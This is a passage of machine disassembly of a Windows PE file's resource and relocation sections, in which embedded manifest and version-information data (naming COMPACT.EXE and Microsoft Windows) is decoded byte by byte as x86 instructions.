  40d311:	imul   esp,DWORD PTR [ebp+0x72],0x22
  40d315:	or     eax,0x2020200a
  40d31a:	and    BYTE PTR [eax],ah
  40d31c:	and    BYTE PTR [eax],ah
  40d31e:	and    BYTE PTR [eax],ah
  40d320:	and    BYTE PTR [eax],ah
  40d322:	and    BYTE PTR [eax],ah
  40d324:	and    BYTE PTR [eax],ah
  40d326:	and    BYTE PTR [ebp+0x69],dh
  40d329:	inc    ecx
  40d32a:	arpl   WORD PTR [ebx+0x65],sp
  40d32d:	jae    0x40d3a2
  40d32f:	cmp    eax,0x6c616622
  40d334:	jae    0x40d39b
  40d336:	and    cl,BYTE PTR ds:0x2020200a
  40d33c:	and    BYTE PTR [eax],ah
  40d33e:	and    BYTE PTR [eax],ah
  40d340:	and    BYTE PTR [eax],ah
  40d342:	and    BYTE PTR [eax],ah
  40d344:	and    BYTE PTR [edi],ch
  40d346:	ds or  eax,0x2020200a
  40d34c:	and    BYTE PTR [eax],ah
  40d34e:	and    BYTE PTR [eax],ah
  40d350:	and    BYTE PTR [edi+ebp*1],bh
  40d353:	jb     0x40d3ba
  40d355:	jno    0x40d3cc
  40d357:	gs jae 0x40d3ce
  40d35a:	gs fs push eax
  40d35d:	jb     0x40d3c8
  40d35f:	jbe    0x40d3ca
  40d361:	ins    BYTE PTR es:[edi],dx
  40d362:	gs addr16 gs jae 0x40d3a5
  40d367:	or     eax,0x2020200a
  40d36c:	and    BYTE PTR [edi+ebp*1],bh
  40d36f:	jae    0x40d3d6
  40d371:	arpl   WORD PTR [ebp+0x72],si
  40d374:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x2f3c0a0d
  40d37c:	je     0x40d3f0
  40d37e:	jne    0x40d3f3
  40d380:	je     0x40d3cb
  40d382:	outs   dx,BYTE PTR ds:[esi]
  40d383:	outs   dx,WORD PTR ds:[esi]
  40d385:	ds or  eax,0x612f3c0a
  40d38b:	jae    0x40d400
  40d38d:	gs ins DWORD PTR es:[edi],dx
  40d38f:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  40d393:	or     eax,0xa0d0a
  40d398:	mov    BYTE PTR [ebx],al
  40d39a:	xor    al,0x0
  40d39c:	add    BYTE PTR [eax],al
  40d39e:	push   esi
  40d39f:	add    BYTE PTR [ebx+0x0],dl
  40d3a2:	pop    edi
  40d3a3:	add    BYTE PTR [esi+0x0],dl
  40d3a6:	inc    ebp
  40d3a7:	add    BYTE PTR [edx+0x0],dl
  40d3aa:	push   ebx
  40d3ab:	add    BYTE PTR [ecx+0x0],cl
  40d3ae:	dec    edi
  40d3af:	add    BYTE PTR [esi+0x0],cl
  40d3b2:	pop    edi
  40d3b3:	add    BYTE PTR [ecx+0x0],cl
  40d3b6:	dec    esi
  40d3b7:	add    BYTE PTR [esi+0x0],al
  40d3ba:	dec    edi
  40d3bb:	add    BYTE PTR [eax],al
  40d3bd:	add    BYTE PTR [eax],al
  40d3bf:	add    BYTE PTR [ebp+0xfeef04],bh
  40d3c5:	add    BYTE PTR [ecx],al
  40d3c7:	add    BYTE PTR [eax],al
  40d3c9:	add    BYTE PTR [edx],cl
  40d3cb:	add    BYTE PTR [eax],al
  40d3cd:	inc    eax
  40d3ce:	add    BYTE PTR [eax],ch
  40d3d0:	add    BYTE PTR [eax],al
  40d3d2:	or     al,BYTE PTR [eax]
  40d3d4:	add    BYTE PTR [eax+0x0],al
  40d3d7:	sub    BYTE PTR [edi],bh
  40d3d9:	add    BYTE PTR [eax],al
  40d3db:	add    BYTE PTR [eax],al
  40d3dd:	add    BYTE PTR [eax],al
  40d3df:	add    BYTE PTR [eax+eax*1],al
  40d3e2:	add    al,0x0
  40d3e4:	add    DWORD PTR [eax],eax
	...
  40d3f2:	add    BYTE PTR [eax],al
  40d3f4:	out    0x2,al
  40d3f6:	add    BYTE PTR [eax],al
  40d3f8:	add    DWORD PTR [eax],eax
  40d3fa:	push   ebx
  40d3fb:	add    BYTE PTR [eax+eax*1+0x72],dh
  40d3ff:	add    BYTE PTR [ecx+0x0],ch
  40d402:	outs   dx,BYTE PTR ds:[esi]
  40d403:	add    BYTE PTR [edi+0x0],ah
  40d406:	inc    esi
  40d407:	add    BYTE PTR [ecx+0x0],ch
  40d40a:	ins    BYTE PTR es:[edi],dx
  40d40b:	add    BYTE PTR [ebp+0x0],ah
  40d40e:	dec    ecx
  40d40f:	add    BYTE PTR [esi+0x0],ch
  40d412:	data16 add BYTE PTR [edi+0x0],ch
  40d416:	add    BYTE PTR [eax],al
  40d418:	ret    0x2
  40d41b:	add    BYTE PTR [ecx],al
  40d41d:	add    BYTE PTR [eax],dh
  40d41f:	add    BYTE PTR [eax+eax*1],dh
  40d422:	xor    BYTE PTR [eax],al
  40d424:	cmp    DWORD PTR [eax],eax
  40d426:	xor    BYTE PTR [eax],al
  40d428:	xor    al,0x0
  40d42a:	inc    edx
  40d42b:	add    BYTE PTR [eax],dh
  40d42d:	add    BYTE PTR [eax],al
  40d42f:	add    BYTE PTR [eax+eax*1+0x16],cl
  40d433:	add    BYTE PTR [ecx],al
  40d435:	add    BYTE PTR [ebx+0x0],al
  40d438:	outs   dx,DWORD PTR ds:[esi]
  40d439:	add    BYTE PTR [ebp+0x0],ch
  40d43c:	jo     0x40d43e
  40d43e:	popa   
  40d43f:	add    BYTE PTR [esi+0x0],ch
  40d442:	jns    0x40d444
  40d444:	dec    esi
  40d445:	add    BYTE PTR [ecx+0x0],ah
  40d448:	ins    DWORD PTR es:[edi],dx
  40d449:	add    BYTE PTR [ebp+0x0],ah
  40d44c:	add    BYTE PTR [eax],al
  40d44e:	add    BYTE PTR [eax],al
  40d450:	dec    ebp
  40d451:	add    BYTE PTR [ecx+0x0],ch
  40d454:	arpl   WORD PTR [eax],ax
  40d456:	jb     0x40d458
  40d458:	outs   dx,DWORD PTR ds:[esi]
  40d459:	add    BYTE PTR [ebx+0x0],dh
  40d45c:	outs   dx,DWORD PTR ds:[esi]
  40d45d:	add    BYTE PTR [esi+0x0],ah
  40d460:	je     0x40d462
  40d462:	and    BYTE PTR [eax],al
  40d464:	inc    ebx
  40d465:	add    BYTE PTR [edi+0x0],ch
  40d468:	jb     0x40d46a
  40d46a:	jo     0x40d46c
  40d46c:	outs   dx,DWORD PTR ds:[esi]
  40d46d:	add    BYTE PTR [edx+0x0],dh
  40d470:	popa   
  40d471:	add    BYTE PTR [eax+eax*1+0x69],dh
  40d475:	add    BYTE PTR [edi+0x0],ch
  40d478:	outs   dx,BYTE PTR ds:[esi]
  40d479:	add    BYTE PTR [eax],al
  40d47b:	add    BYTE PTR [eax+eax*1+0x16],dl
  40d47f:	add    BYTE PTR [ecx],al
  40d481:	add    BYTE PTR [esi+0x0],al
  40d484:	imul   eax,DWORD PTR [eax],0x65006c
  40d48a:	inc    esp
  40d48b:	add    BYTE PTR [ebp+0x0],ah
  40d48e:	jae    0x40d490
  40d490:	arpl   WORD PTR [eax],ax
  40d492:	jb     0x40d494
  40d494:	imul   eax,DWORD PTR [eax],0x740070
  40d49a:	imul   eax,DWORD PTR [eax],0x6e006f
  40d4a0:	add    BYTE PTR [eax],al
  40d4a2:	add    BYTE PTR [eax],al
  40d4a4:	inc    esi
  40d4a5:	add    BYTE PTR [ecx+0x0],ch
  40d4a8:	ins    BYTE PTR es:[edi],dx
  40d4a9:	add    BYTE PTR [ebp+0x0],ah
  40d4ac:	and    BYTE PTR [eax],al
  40d4ae:	inc    ebx
  40d4af:	add    BYTE PTR [edi+0x0],ch
  40d4b2:	ins    DWORD PTR es:[edi],dx
  40d4b3:	add    BYTE PTR [eax+0x0],dh
  40d4b6:	jb     0x40d4b8
  40d4b8:	add    BYTE PTR gs:[ebx+0x0],dh
  40d4bc:	jae    0x40d4be
  40d4be:	and    BYTE PTR [eax],al
  40d4c0:	push   ebp
  40d4c1:	add    BYTE PTR [eax+eax*1+0x69],dh
  40d4c5:	add    BYTE PTR [eax+eax*1+0x69],ch
  40d4c9:	add    BYTE PTR [eax+eax*1+0x79],dh
  40d4cd:	add    BYTE PTR [eax],al
  40d4cf:	add    BYTE PTR [esi+0x0],ah
  40d4d2:	and    eax,DWORD PTR [eax]
  40d4d4:	add    DWORD PTR [eax],eax
  40d4d6:	inc    esi
  40d4d7:	add    BYTE PTR [ecx+0x0],ch
  40d4da:	ins    BYTE PTR es:[edi],dx
  40d4db:	add    BYTE PTR [ebp+0x0],ah
  40d4de:	push   esi
  40d4df:	add    BYTE PTR [ebp+0x0],ah
  40d4e2:	jb     0x40d4e4
  40d4e4:	jae    0x40d4e6
  40d4e6:	imul   eax,DWORD PTR [eax],0x6e006f
  40d4ec:	add    BYTE PTR [eax],al
  40d4ee:	add    BYTE PTR [eax],al
  40d4f0:	xor    DWORD PTR [eax],eax
  40d4f2:	xor    BYTE PTR [eax],al
  40d4f4:	add    BYTE PTR cs:[eax],dh
  40d4f7:	add    BYTE PTR [esi],ch
  40d4f9:	add    BYTE PTR [ecx],dh
  40d4fb:	add    BYTE PTR [eax],dh
  40d4fd:	add    BYTE PTR [edx],dh
  40d4ff:	add    BYTE PTR [eax+eax*1],dh
  40d502:	xor    BYTE PTR [eax],al
  40d504:	add    BYTE PTR cs:[ecx],dh
  40d507:	add    BYTE PTR [esi],dh
  40d509:	add    BYTE PTR [ebx],dh
  40d50b:	add    BYTE PTR [eax],bh
  40d50d:	add    BYTE PTR [eax+eax*1],dh
  40d510:	and    BYTE PTR [eax],al
  40d512:	sub    BYTE PTR [eax],al
  40d514:	je     0x40d516
  40d516:	push   0x2e003100
  40d51b:	add    BYTE PTR [ecx],dh
  40d51d:	add    BYTE PTR ds:0x37003000,dh
  40d523:	add    BYTE PTR [eax],dh
  40d525:	add    BYTE PTR [ecx],bh
  40d527:	add    BYTE PTR ds:0x37003100,ch
  40d52d:	add    BYTE PTR [eax],dh
  40d52f:	add    BYTE PTR [eax],dh
  40d531:	add    BYTE PTR [ecx],ch
  40d533:	add    BYTE PTR [eax],al
  40d535:	add    BYTE PTR [eax],al
  40d537:	add    BYTE PTR [eax],dh
  40d539:	add    BYTE PTR [eax],cl
  40d53b:	add    BYTE PTR [ecx],al
  40d53d:	add    BYTE PTR [ecx+0x0],cl
  40d540:	outs   dx,BYTE PTR ds:[esi]
  40d541:	add    BYTE PTR [eax+eax*1+0x65],dh
  40d545:	add    BYTE PTR [edx+0x0],dh
  40d548:	outs   dx,BYTE PTR ds:[esi]
  40d549:	add    BYTE PTR [ecx+0x0],ah
  40d54c:	ins    BYTE PTR es:[edi],dx
  40d54d:	add    BYTE PTR [esi+0x0],cl
  40d550:	popa   
  40d551:	add    BYTE PTR [ebp+0x0],ch
  40d554:	add    BYTE PTR gs:[eax],al
  40d557:	add    BYTE PTR [ebx+0x0],ah
  40d55a:	outs   dx,DWORD PTR ds:[esi]
  40d55b:	add    BYTE PTR [ebp+0x0],ch
  40d55e:	jo     0x40d560
  40d560:	popa   
  40d561:	add    BYTE PTR [ebx+0x0],ah
  40d564:	je     0x40d566
  40d566:	add    BYTE PTR [eax],al
  40d568:	add    BYTE PTR [eax],0x2e
  40d56b:	add    BYTE PTR [ecx],al
  40d56d:	add    BYTE PTR [eax+eax*1+0x65],cl
  40d571:	add    BYTE PTR [edi+0x0],ah
  40d574:	popa   
  40d575:	add    BYTE PTR [eax+eax*1+0x43],ch
  40d579:	add    BYTE PTR [edi+0x0],ch
  40d57c:	jo     0x40d57e
  40d57e:	jns    0x40d580
  40d580:	jb     0x40d582
  40d582:	imul   eax,DWORD PTR [eax],0x680067
  40d588:	je     0x40d58a
  40d58a:	add    BYTE PTR [eax],al
  40d58c:	test   eax,0x4d002000
  40d591:	add    BYTE PTR [ecx+0x0],ch
  40d594:	arpl   WORD PTR [eax],ax
  40d596:	jb     0x40d598
  40d598:	outs   dx,DWORD PTR ds:[esi]
  40d599:	add    BYTE PTR [ebx+0x0],dh
  40d59c:	outs   dx,DWORD PTR ds:[esi]
  40d59d:	add    BYTE PTR [esi+0x0],ah
  40d5a0:	je     0x40d5a2
  40d5a2:	and    BYTE PTR [eax],al
  40d5a4:	inc    ebx
  40d5a5:	add    BYTE PTR [edi+0x0],ch
  40d5a8:	jb     0x40d5aa
  40d5aa:	jo     0x40d5ac
  40d5ac:	outs   dx,DWORD PTR ds:[esi]
  40d5ad:	add    BYTE PTR [edx+0x0],dh
  40d5b0:	popa   
  40d5b1:	add    BYTE PTR [eax+eax*1+0x69],dh
  40d5b5:	add    BYTE PTR [edi+0x0],ch
  40d5b8:	outs   dx,BYTE PTR ds:[esi]
  40d5b9:	add    BYTE PTR [esi],ch
  40d5bb:	add    BYTE PTR [eax],ah
  40d5bd:	add    BYTE PTR [ecx+0x0],al
  40d5c0:	ins    BYTE PTR es:[edi],dx
  40d5c1:	add    BYTE PTR [eax+eax*1+0x20],ch
  40d5c5:	add    BYTE PTR [edx+0x0],dh
  40d5c8:	imul   eax,DWORD PTR [eax],0x680067
  40d5ce:	je     0x40d5d0
  40d5d0:	jae    0x40d5d2
  40d5d2:	and    BYTE PTR [eax],al
  40d5d4:	jb     0x40d5d6
  40d5d6:	add    BYTE PTR gs:[ebx+0x0],dh
  40d5da:	add    BYTE PTR gs:[edx+0x0],dh
  40d5de:	jbe    0x40d5e0
  40d5e0:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  40d5e5:	add    BYTE PTR [eax],al
  40d5e7:	add    BYTE PTR [eax+0x0],al
  40d5ea:	or     al,0x0
  40d5ec:	add    DWORD PTR [eax],eax
  40d5ee:	dec    edi
  40d5ef:	add    BYTE PTR [edx+0x0],dh
  40d5f2:	imul   eax,DWORD PTR [eax],0x690067
  40d5f8:	outs   dx,BYTE PTR ds:[esi]
  40d5f9:	add    BYTE PTR [ecx+0x0],ah
  40d5fc:	ins    BYTE PTR es:[edi],dx
  40d5fd:	add    BYTE PTR [esi+0x0],al
  40d600:	imul   eax,DWORD PTR [eax],0x65006c
  40d606:	outs   dx,BYTE PTR ds:[esi]
  40d607:	add    BYTE PTR [ecx+0x0],ah
  40d60a:	ins    DWORD PTR es:[edi],dx
  40d60b:	add    BYTE PTR [ebp+0x0],ah
  40d60e:	add    BYTE PTR [eax],al
  40d610:	inc    ebx
  40d611:	add    BYTE PTR [edi+0x0],cl
  40d614:	dec    ebp
  40d615:	add    BYTE PTR [eax+0x0],dl
  40d618:	inc    ecx
  40d619:	add    BYTE PTR [ebx+0x0],al
  40d61c:	push   esp
  40d61d:	add    BYTE PTR [esi],ch
  40d61f:	add    BYTE PTR [ebp+0x0],al
  40d622:	pop    eax
  40d623:	add    BYTE PTR [ebp+0x0],al
  40d626:	add    BYTE PTR [eax],al
  40d628:	push   0x0
  40d62a:	and    eax,0x50000100
  40d62f:	add    BYTE PTR [edx+0x0],dh
  40d632:	outs   dx,DWORD PTR ds:[esi]
  40d633:	add    BYTE PTR [eax+eax*1+0x75],ah
  40d637:	add    BYTE PTR [ebx+0x0],ah
  40d63a:	je     0x40d63c
  40d63c:	dec    esi
  40d63d:	add    BYTE PTR [ecx+0x0],ah
  40d640:	ins    DWORD PTR es:[edi],dx
  40d641:	add    BYTE PTR [ebp+0x0],ah
  40d644:	add    BYTE PTR [eax],al
  40d646:	add    BYTE PTR [eax],al
  40d648:	dec    ebp
  40d649:	add    BYTE PTR [ecx+0x0],ch
  40d64c:	arpl   WORD PTR [eax],ax
  40d64e:	jb     0x40d650
  40d650:	outs   dx,DWORD PTR ds:[esi]
  40d651:	add    BYTE PTR [ebx+0x0],dh
  40d654:	outs   dx,DWORD PTR ds:[esi]
  40d655:	add    BYTE PTR [esi+0x0],ah
  40d658:	je     0x40d65a
  40d65a:	scas   al,BYTE PTR es:[edi]
  40d65b:	add    BYTE PTR [eax],ah
  40d65d:	add    BYTE PTR [edi+0x0],dl
  40d660:	imul   eax,DWORD PTR [eax],0x64006e
  40d666:	outs   dx,DWORD PTR ds:[esi]
  40d667:	add    BYTE PTR [edi+0x0],dh
  40d66a:	jae    0x40d66c
  40d66c:	scas   al,BYTE PTR es:[edi]
  40d66d:	add    BYTE PTR [eax],ah
  40d66f:	add    BYTE PTR [edi+0x0],cl
  40d672:	jo     0x40d674
  40d674:	add    BYTE PTR gs:[edx+0x0],dh
  40d678:	popa   
  40d679:	add    BYTE PTR [eax+eax*1+0x69],dh
  40d67d:	add    BYTE PTR [esi+0x0],ch
  40d680:	add    BYTE PTR [bx+si],ah
  40d683:	add    BYTE PTR [ebx+0x0],dl
  40d686:	jns    0x40d688
  40d688:	jae    0x40d68a
  40d68a:	je     0x40d68c
  40d68c:	add    BYTE PTR gs:[ebp+0x0],ch
  40d690:	add    BYTE PTR [eax],al
  40d692:	add    BYTE PTR [eax],al
  40d694:	inc    esi
  40d695:	add    BYTE PTR [ecx],dl
  40d697:	add    BYTE PTR [ecx],al
  40d699:	add    BYTE PTR [eax+0x0],dl
  40d69c:	jb     0x40d69e
  40d69e:	outs   dx,DWORD PTR ds:[esi]
  40d69f:	add    BYTE PTR [eax+eax*1+0x75],ah
  40d6a3:	add    BYTE PTR [ebx+0x0],ah
  40d6a6:	je     0x40d6a8
  40d6a8:	push   esi
  40d6a9:	add    BYTE PTR [ebp+0x0],ah
  40d6ac:	jb     0x40d6ae
  40d6ae:	jae    0x40d6b0
  40d6b0:	imul   eax,DWORD PTR [eax],0x6e006f
  40d6b6:	add    BYTE PTR [eax],al
  40d6b8:	xor    DWORD PTR [eax],eax
  40d6ba:	xor    BYTE PTR [eax],al
  40d6bc:	add    BYTE PTR cs:[eax],dh
  40d6bf:	add    BYTE PTR [esi],ch
  40d6c1:	add    BYTE PTR [ecx],dh
  40d6c3:	add    BYTE PTR [eax],dh
  40d6c5:	add    BYTE PTR [edx],dh
  40d6c7:	add    BYTE PTR [eax+eax*1],dh
  40d6ca:	xor    BYTE PTR [eax],al
  40d6cc:	add    BYTE PTR cs:[ecx],dh
  40d6cf:	add    BYTE PTR [esi],dh
  40d6d1:	add    BYTE PTR [ebx],dh
  40d6d3:	add    BYTE PTR [eax],bh
  40d6d5:	add    BYTE PTR [eax+eax*1],dh
  40d6d8:	add    BYTE PTR [eax],al
  40d6da:	add    BYTE PTR [eax],al
  40d6dc:	inc    esp
  40d6dd:	add    BYTE PTR [eax],al
  40d6df:	add    BYTE PTR [ecx],al
  40d6e1:	add    BYTE PTR [esi+0x0],dl
  40d6e4:	popa   
  40d6e5:	add    BYTE PTR [edx+0x0],dh
  40d6e8:	inc    esi
  40d6e9:	add    BYTE PTR [ecx+0x0],ch
  40d6ec:	ins    BYTE PTR es:[edi],dx
  40d6ed:	add    BYTE PTR [ebp+0x0],ah
  40d6f0:	dec    ecx
  40d6f1:	add    BYTE PTR [esi+0x0],ch
  40d6f4:	data16 add BYTE PTR [edi+0x0],ch
  40d6f8:	add    BYTE PTR [eax],al
  40d6fa:	add    BYTE PTR [eax],al
  40d6fc:	and    al,0x0
  40d6fe:	add    al,0x0
  40d700:	add    BYTE PTR [eax],al
  40d702:	push   esp
  40d703:	add    BYTE PTR [edx+0x0],dh
  40d706:	popa   
  40d707:	add    BYTE PTR [esi+0x0],ch
  40d70a:	jae    0x40d70c
  40d70c:	ins    BYTE PTR es:[edi],dx
  40d70d:	add    BYTE PTR [ecx+0x0],ah
  40d710:	je     0x40d712
  40d712:	imul   eax,DWORD PTR [eax],0x6e006f
  40d718:	add    BYTE PTR [eax],al
  40d71a:	add    BYTE PTR [eax],al
  40d71c:	or     DWORD PTR [eax+esi*4],eax
  40d71f:	add    al,0xcd
  40d721:	dec    ch
  40d723:	dec    al
  40d725:	add    BYTE PTR [eax],al
  40d727:	add    BYTE PTR [eax],al
  40d729:	add    BYTE PTR [ecx],al
  40d72b:	add    BYTE PTR [eax],al
  40d72d:	add    BYTE PTR [eax],al
  40d72f:	add    BYTE PTR [ecx],dl
  40d731:	add    BYTE PTR [eax],al
  40d733:	add    BYTE PTR [eax],al
  40d735:	add    BYTE PTR [eax],al
  40d737:	add    BYTE PTR [edx],al
  40d739:	add    BYTE PTR [eax],al
  40d73b:	add    BYTE PTR [esi+0x4c22c8a4],ch
  40d741:	sahf   
  40d742:	in     al,dx
  40d743:	dec    esp
  40d744:	add    esp,DWORD PTR [ebx]
  40d746:	iret   
  40d747:	mov    ecx,0x6e649dc1
  40d74c:	jns    0x40d6dc
  40d74e:	adc    al,0x20
  40d750:	mov    WORD PTR [edx+ecx*1-0x1c1502cb],?
  40d757:	push   ebp
  40d758:	push   edi
  40d759:	imul   ecx,DWORD PTR [ecx],0xca
	...
  40d773:	add    BYTE PTR [eax+0xe000000],cl
  40d779:	add    BYTE PTR [eax],al
  40d77b:	add    BYTE PTR [eax+0x8000000],bl
  40d781:	add    BYTE PTR [eax],al
  40d783:	add    BYTE PTR [eax+0xe000000],ah
  40d789:	add    BYTE PTR [eax],al
  40d78b:	add    BYTE PTR [eax+0x8000000],dh
	...
  40d799:	add    BYTE PTR [eax],al
  40d79b:	add    BYTE PTR [eax+0xc000000],bh
  40d7a1:	add    BYTE PTR [eax],al
  40d7a3:	add    BYTE PTR [eax],al
  40d7a5:	add    BYTE PTR [eax],al
  40d7a7:	add    BYTE PTR [ebp+0x0],cl
  40d7aa:	push   ebp
  40d7ab:	add    BYTE PTR [ecx+0x0],cl
	...
  40d7b6:	add    BYTE PTR [eax],al
  40d7b8:	adc    BYTE PTR [eax],al
  40d7ba:	add    BYTE PTR [eax],al
  40d7bc:	sbb    BYTE PTR [eax],al
  40d7be:	add    BYTE PTR [eax],al
  40d7c0:	dec    ebp
  40d7c1:	add    BYTE PTR [ebp+0x0],dl
  40d7c4:	dec    ecx
	...
  40d7cd:	add    BYTE PTR [eax],al
  40d7cf:	add    BYTE PTR [ebx],cl
  40d7d1:	add    BYTE PTR [eax],al
  40d7d3:	add    BYTE PTR [eax],dl
  40d7d5:	add    BYTE PTR [eax],al
  40d7d7:	add    BYTE PTR [ebp+0x0],ah
  40d7da:	outs   dx,BYTE PTR ds:[esi]
  40d7db:	add    BYTE PTR ds:0x53005500,ch
  40d7e1:	add    BYTE PTR [eax],al
  40d7e3:	add    BYTE PTR [eax],al
  40d7e5:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

0040e000 <.reloc>:
  40e000:	add    BYTE PTR [eax],dl
  40e002:	add    BYTE PTR [eax],al
  40e004:	sub    BYTE PTR [eax],al
  40e006:	add    BYTE PTR [eax],al
  40e008:	add    al,0x30
  40e00a:	adc    BYTE PTR [eax],dh
  40e00c:	adc    al,0x30
  40e00e:	nop
  40e00f:	xor    BYTE PTR [eax+esi*1+0x35a435a0],dl
  40e016:	test   al,0x35
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	xor    eax,0x3d583d54
  40e01e:	pusha  
  40e01f:	cmp    eax,0x3fb03d68
  40e024:	sar    DWORD PTR [edi],0x0
  40e027:	add    BYTE PTR [eax],al
  40e029:	and    BYTE PTR [eax],al
  40e02b:	add    BYTE PTR [ecx+eax*1+0x0],bl
  40e02f:	add    BYTE PTR [eax],al
  40e031:	xor    BYTE PTR [edx],cl
  40e033:	xor    BYTE PTR [ebx],dh
  40e035:	xor    BYTE PTR [eax+0x30],al
  40e038:	xor    BYTE PTR fs:[edi+0x30],dh
  40e03c:	xor    BYTE PTR [eax],0x89
  40e03f:	xor    BYTE PTR [edi-0x4ecf57d0],bl
  40e045:	xor    BYTE PTR [eax+esi*1+0x30cf30c3],bh
  40e04c:	aad    0x30
  40e04e:	fdiv   QWORD PTR [eax]
  40e050:	out    0x30,eax
  40e052:	sti    
  40e053:	xor    BYTE PTR [ebx],al
  40e055:	xor    DWORD PTR [esi],ecx
  40e057:	xor    DWORD PTR [esi],esi
  40e059:	xor    DWORD PTR [esi+0x31],ecx
  40e05c:	push   ebp
  40e05d:	xor    DWORD PTR [ebx+0x31],esp
  40e060:	imul   esi,DWORD PTR [ecx],0x317c3172
  40e066:	xor    DWORD PTR [ecx],0xffffff94
  40e069:	xor    DWORD PTR [edx-0x28ce35cf],ebx
  40e06f:	xor    esp,ebx
  40e071:	xor    eax,ebp
  40e073:	xor    edx,edi
  40e075:	xor    DWORD PTR [eax],esp
  40e077:	xor    ch,BYTE PTR ds:0x44323632
  40e07d:	xor    cl,BYTE PTR [edx+0x32]
  40e080:	push   edi
  40e081:	xor    ah,BYTE PTR [eax+0x32]
  40e084:	xor    dh,BYTE PTR [bp+0x32]
  40e088:	jl     0x40e0bc
  40e08a:	xor    BYTE PTR [edx],0xa1
  40e08d:	xor    ah,cl
  40e08f:	xor    dh,al
  40e091:	xor    cl,BYTE PTR ds:0x2e332333
  40e097:	xor    ecx,DWORD PTR [ecx+0x33]
  40e09a:	push   eax
  40e09b:	xor    esp,DWORD PTR [eax+0x33]
  40e09e:	imul   esi,DWORD PTR [ebx],0x73
  40e0a1:	xor    edi,DWORD PTR [ebp+0x33]
  40e0a4:	xchg   BYTE PTR [ebx],dh
  40e0a6:	xchg   esi,eax
  40e0a7:	xor    esp,DWORD PTR [ecx-0x4ccc56cd]
  40e0ad:	xor    edi,DWORD PTR [ebx+esi*1+0x33dc33d3]
  40e0b4:	cmc    
  40e0b5:	xor    ecx,DWORD PTR [ecx]
  40e0b7:	xor    al,0xf
  40e0b9:	xor    al,0x3c
  40e0bb:	xor    al,0x47
  40e0bd:	xor    al,0x51
  40e0bf:	xor    al,0x5a
  40e0c1:	xor    al,0x6f
  40e0c3:	xor    al,0x78
  40e0c5:	xor    al,0x8d
  40e0c7:	xor    al,0x96
  40e0c9:	xor    al,0xad
  40e0cb:	xor    al,0xb6
  40e0cd:	xor    al,0xe1
  40e0cf:	xor    al,0xe8
  40e0d1:	xor    al,0x2
  40e0d3:	xor    eax,0x35273509
  40e0d8:	cs xor eax,0x3553354c
  40e0de:	jno    0x40e115
  40e0e0:	jp     0x40e117
  40e0e2:	call   0xbd35:0xb635a535
  40e0e9:	xor    eax,0x35d535ce
  40e0ee:	loopne 0x40e125
  40e0f0:	call   0xfc76d62a
  40e0f5:	xor    eax,0x3613360b
  40e0fa:	aaa    
  40e0fb:	ss aas 
  40e0fd:	ss data16 ss ins BYTE PTR es:[edi],dx
  40e101:	test   DWORD PTR ss:[esi],esi
  40e104:	xchg   ebx,eax
  40e105:	ss mov eax,0xd536c136
  40e10b:	fbstp  TBYTE PTR ss:[esi]
  40e10e:	in     eax,0x36
  40e110:	sbb    esi,DWORD PTR [edi]
  40e112:	and    DWORD PTR [edi],esi
  40e114:	cmp    al,0x37
  40e116:	dec    esi
  40e117:	aaa    
  40e118:	pop    esp
  40e119:	aaa    
  40e11a:	push   0x37
  40e11c:	xchg   ebp,eax
  40e11d:	aaa    
  40e11e:	shl    BYTE PTR [edi],1
  40e120:	(bad)  
  40e121:	aaa    
  40e122:	repnz aaa 
  40e124:	or     bh,BYTE PTR [eax]
  40e126:	inc    edx
  40e127:	cmp    BYTE PTR [edx+0x38],ah
  40e12a:	ret    
  40e12b:	cmp    dh,dl
  40e12d:	cmp    dh,ch
  40e12f:	cmp    BYTE PTR [ecx],al
  40e131:	cmp    DWORD PTR [eax],ebp
  40e133:	cmp    DWORD PTR [ebp+0x39],ebx
  40e136:	xchg   edx,eax
  40e137:	cmp    DWORD PTR [eax-0x29c656c7],ebx
  40e13d:	cmp    esi,esi
  40e13f:	cmp    DWORD PTR [eax],eax
  40e141:	cmp    cl,BYTE PTR ds:0x5f3a3f3a
  40e147:	cmp    dh,BYTE PTR [ecx+0x3a]
  40e14a:	jg     0x40e186
  40e14c:	les    edi,FWORD PTR [edx]
  40e14e:	jmp    0x203b:0x103b003a
  40e155:	cmp    eax,DWORD PTR [edi+0x3b]
  40e158:	xor    eax,0x573ce33c
  40e15d:	cmp    eax,0x3e093dc9
  40e162:	cmp    DWORD PTR [esi],edi
  40e164:	pop    esp
  40e165:	ds jb  0x40e1a6
  40e168:	cmp    BYTE PTR [esi],0x8f
  40e16b:	ds test al,0x3e
  40e16e:	mov    edi,0xda3eca3e
  40e173:	ds jmp 0x233f:0xd3f043e
  40e17b:	aas    
  40e17c:	ins    BYTE PTR es:[edi],dx
  40e17d:	aas    
  40e17e:	cmp    BYTE PTR [edi],0xdb
  40e181:	aas    
  40e182:	jmp    0x70e1c6
  40e187:	add    ah,ch
  40e189:	add    BYTE PTR [eax],al
  40e18b:	add    BYTE PTR [ebx],bl
  40e18d:	xor    BYTE PTR [ebp+0x30],al
  40e190:	pusha  
  40e191:	xor    BYTE PTR [edx-0xecf2ed0],dl
  40e197:	xor    BYTE PTR [eax-0x35ce3fcf],dh
  40e19d:	xor    eax,edx
  40e19f:	xor    ebp,edx
  40e1a1:	xor    ebx,edi
  40e1a3:	xor    DWORD PTR [edx+esi*1],ecx
  40e1a6:	xor    dh,BYTE PTR [edx]
  40e1a8:	cmp    dh,BYTE PTR [edx]
  40e1aa:	inc    ecx
  40e1ab:	xor    ah,BYTE PTR [edx+esi*1-0x7d]
  40e1af:	xor    cl,BYTE PTR [ebp-0x59cd6ace]
  40e1b5:	xor    bh,BYTE PTR [eax-0x35cd41ce]
  40e1bb:	xor    bl,bl
  40e1bd:	xor    ch,BYTE PTR [ebx+esi*1]
  40e1c0:	outs   dx,DWORD PTR ds:[esi]
  40e1c1:	xor    ecx,DWORD PTR [ecx-0x3ccc69cd]
  40e1c7:	xor    ebx,DWORD PTR [esi]
  40e1c9:	xor    al,0x2f
  40e1cb:	xor    al,0x43
  40e1cd:	xor    al,0x81
  40e1cf:	xor    al,0xf5
  40e1d1:	xor    al,0x19
  40e1d3:	xor    eax,0x355c352d
  40e1d8:	push   0x35
  40e1da:	jnp    0x40e211
  40e1dc:	mov    esi,DWORD PTR ds:0x364b35c9
  40e1e2:	push   ebx
  40e1e3:	ss pop edi
